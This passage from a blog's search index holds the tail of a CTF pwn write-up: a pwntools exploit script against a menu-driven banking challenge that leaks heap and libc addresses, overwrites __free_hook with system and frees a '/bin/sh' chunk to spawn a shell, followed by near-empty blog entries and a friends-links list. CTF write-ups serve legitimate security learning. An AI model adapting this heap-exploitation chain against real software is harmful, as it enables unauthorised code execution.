class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Click: &quot;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">num,passwd</span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Card Numbers: &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">    sla(<span class="string">&quot;Password: &quot;</span>,<span class="built_in">str</span>(passwd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span>(<span class="params">name,money,addr=<span class="number">0</span>,data=<span class="string">&#x27;\n&#x27;</span>,size=<span class="number">0</span>,result=<span class="number">0</span></span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Transfer&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;who? &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;How much? &quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line">    <span class="keyword">if</span> name==<span class="string">&quot;hacker&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;hacker: Great!&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="keyword">elif</span> name==<span class="string">&quot;guest&quot;</span>:</span><br><span class="line">        sa(<span class="string">&quot;data: &quot;</span>,data)</span><br><span class="line">    <span class="keyword">elif</span> name==<span class="string">&quot;ghost&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;ghost: &amp;^%$#@!   :)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> name==<span class="string">&quot;abyss&quot;</span>:</span><br><span class="line">        sl(<span class="built_in">str</span>(result))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">money</span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Put&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;How Much? &quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deposit</span>(<span class="params">money</span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Deposit&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;How Much? &quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line">    choose(<span class="string">&quot;Info&quot;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="number">0</span>,<span class="number">123456</span>)</span><br><span class="line">info()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    put(<span class="number">0x190</span>*i)</span><br><span class="line">    deposit(<span class="number">0x190</span>*i)</span><br><span class="line">    put(<span class="number">0x190</span>*i)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x70</span>)</span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x50</span>)</span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x70</span>)</span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;admin&quot;</span>,<span class="number">0x1e</span>+<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;I think &quot;</span>)</span><br><span class="line">heap=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>))</span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>):</span><br><span class="line">    transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x3a0</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;admin&quot;</span>,<span class="number">0x20</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;I think &quot;</span>)</span><br><span class="line">main_arena=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ebbe0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x630</span>+<span class="number">0x10</span>-i*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x530</span>+<span class="number">0x10</span>)</span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x550</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=p64(free_hook)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=<span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=p64(system))</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x540</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(free_hook)</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>CTf</tag>
      </tags>
  </entry>
  <entry>
    <title>windows保护机制</title>
    <url>/2023/11/22/windows%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>windows pwn 基础——程序保护。</p>
<span id="more"></span>


]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>pwn</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Friends</title>
    <url>/links/index.html</url>
    <content><![CDATA[<p>Joe1sn:<a href="https://blog.joe1sn.top/">https://blog.joe1sn.top/</a><br>       <a href="https://joe1sn.eu.org/">https://joe1sn.eu.org</a><br>cnitlrt:<a href="https://cnitlrt.github.io/">https://cnitlrt.github.io/</a><br>e4l4:<a href="https://blog.e4l4.com/">https://blog.e4l4.com/</a><br>sxdxwb:<a href="https://blog.csdn.net/qq_59950255/">https://blog.csdn.net/qq_59950255/</a><br>J0k3r:<a href="https://www.yuque.com/joker-krzh1/">https://www.yuque.com/joker-krzh1/</a><br>cri1stur:<a href="https://cri1stur.github.io/">https://cri1stur.github.io/</a><br>kaikaix:<a href="https://kaikaix.github.io/">https://kaikaix.github.io/</a><br>sohaha:<a href="https://blog.csdn.net/weixin_61283545?spm=1000.2115.3001.5343/">https://blog.csdn.net/weixin_61283545?spm=1000.2115.3001.5343/</a><br>malabis:<a href="http://www.malabis.site/">www.malabis.site/</a></p>
]]></content>
  </entry>
</search>
